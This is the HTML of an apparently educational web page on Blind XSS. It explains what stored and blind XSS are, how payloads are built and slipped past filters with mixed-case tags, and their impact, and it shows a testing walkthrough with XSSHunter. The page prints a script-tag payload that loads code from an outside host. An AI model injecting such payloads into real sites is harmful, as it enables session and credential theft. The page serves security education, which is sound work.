            <div class="par">
                <p>One of the many attacks prevalent <a class="supLink" href="#r1">[1]</a> across websites today is
                    cross-site scripting
                    (XSS), a type of injection attack that seeks to manipulate the end user's data.<a class="supLink"
                        href="#r2">[2]</a>
                <p>When we say injection, we are talking about code being sent to a web application that will execute on
                    the
                    victim's
                    browser.<a class="supLink" href="#r3">[3]</a> This code takes advantage of HTML elements, URLs, and
                    other areas of
                    input that take unvalidated data.</p>
                <p>XSS also comes in a variety of different types which produce different outcomes. For this topic, we
                    will
                    be focusing on
                    Blind XSS.</p>
            </div>
        </div>

        <button class="tab">What is Blind XSS?</button>
        <div class="content">
            <div class="par">
                <p>Blind XSS is a type of 'stored' XSS attack, where the attacker's payload (code and data) is sent to
                    the
                    back end of a web application, i.e. the database system. <a class="supLink" href="#r4">[4]</a>
                    Unlike
                    'reflected'
                    XSS attacks, the code in a stored XSS attack is permanently saved by the web server and can
                    therefore be
                    executed
                    multiple times.</a></p>
                <p>But in Blind XSS, the attacker does not see the outcome of their attack, as the payload is executed
                    in a
                    different
                    application that they do not have access to. In practice, the code would normally execute when an
                    administrator
                    opens an admin panel on the back end. <a class="supLink" href="#r5">[5]</a></p>
            </div>
        </div>

        <button class="tab">How does Blind XSS work?</button>
        <div class="content">
            <div class="par">
                <p>For a Blind XSS attack to be performed, there needs to be an area of input - such as a form field or
                    textbox - that will take
                    unvalidated
                    or unfiltered user data. This means that the field accepts an input of any format and will allow the
                    attacker payload
                    to be injected. This also applies to the back-end application, where inputs are not sanitised before
                    being saved.</p>
                <p>Next, the payload must be inserted into the input field. This would consist of a script tag along
                    with
                    the source of the script.
                    However, we do need to consider how the input will be perceived by the interpreter - meaning we must
                    format our payload in a specific
                    way. For instance, we would close off any tags so that the script is being interpreted as HTML
                    rather
                    than plaintext. We also need
                    to make assumptions about the way that the input may be filtered, such as blocking the word 'script'
                    or
                    'src'. We can try to overcome
                    these blocks by changing the formatting of these words by writing 'SCRIPT' or 'sRc', for example.
                    But
                    this may take a few attempts,
                    and we can only make a guess. Once we have constructed our payload, we can then submit it.</p>

        </div>

        <button class="tab">What is the Impact of Blind XSS?</button>
        <div class="content">
            <div class="par">
                <p>The consequences of a Blind XSS attack could be severe. Imagine if an administrator tried to login to
                    an application but was instead misdirected to a malicious website disguised as the target page -
                    login details could be entered into a fake login form and stolen by the attacker. Or an attacker
                    could steal sensitive data from a session cookie. No matter the situation, the user's data is at
                    risk, and could even be used to carry out further attacks. With newly found administrative access,
                    an attacker could seek out more sensitive data to steal or manipulate, bypassing exclusive access
                    controls. Blind XSS is especially dangerous as it is harder to detect and can affect many users at
                    once.</p>
                <p>Many reports about the impact of Blind XSS have been produced. For example, in 2018, 380,000 British
                    Airways customers had their personal details stolen in a Magecart attack. The attackers had injected
                    a card-skimming script on the payments page that was able to gather debit/credit card information.
                    <a class="supLink" href="#r6">[6]</a>Magecart is a common attack found targeting e-commerce sites,
                    with stored and blind XSS attacks making up the majority of these attacks. <a class="supLink"
                        href="#r7">[7]</a>
                </p>
                </p>
            </div>
        </div>

        <button class="tab">How to Reduce the Impact?</button>
        <div class="content">
            <div class="par">
                <p>Fortunately, there are many researched methods of reducing and eliminating the impact of Blind XSS
                    attacks.</p>
                <p>One of the most common and effective methods is to sanitise external input <a class="supLink"
                        href="#r8">[8]</a>. This has shown to be
                    effective in removing malicious scripts and unwanted inputs. To sanitise user inputs, you can use
                    various libraries to remove malicious code, or you can force formatting requirements on the user.

        <button class="tab">How to Test for Blind XSS?</button>
        <div class="content">
            <div class="par">
                <div class="demoimgs"><img src="icons\blog.png"></div>

                <p>We are able to test for Blind XSS vulnerabilities by injecting payloads anywhere our application
                    retrieves user input. In this example, I have entered
                    <textarea readonly><script src="https://js.rip/552m2ljnhs"></script></textarea>
                    into an input form.
                </p>
                <div class="demoimgs"><img src="icons\inputform.png"></div>
                <p>If successful, the script
                    should load when the page is opened. In a Blind XSS attack, it would load in a separate
                    area/application.
                </p>
                <p>Next, we enter any other needed information and submit the form.</p>
                <div class="demoimgs"><img src="icons\postcomment.png"></div>
                <p>BUT - how do we know if it worked?</p>
                <div class="demoimgs"><img src="icons\xsshunter.png"></div>
                <p>This is where tools like XSSHunter <a class="supLink" href="#r9">[9]</a> come in. XSSHunter is used
                    to screenshot pages where a
                    vulnerability was found, i.e. where your script successfully executed. This means you will be able
                    to see the page where your Blind XSS attack loaded even if it is in another application.</p>
                <div class="demoimgs"><img src="icons\xssreport.png"></div>
                <p>Here, you can see that it has taken a screenshot of the vulnerable page. We can also see extra
                    information in our XSSHunter profile if we wish to understand the source of the attack.</p>
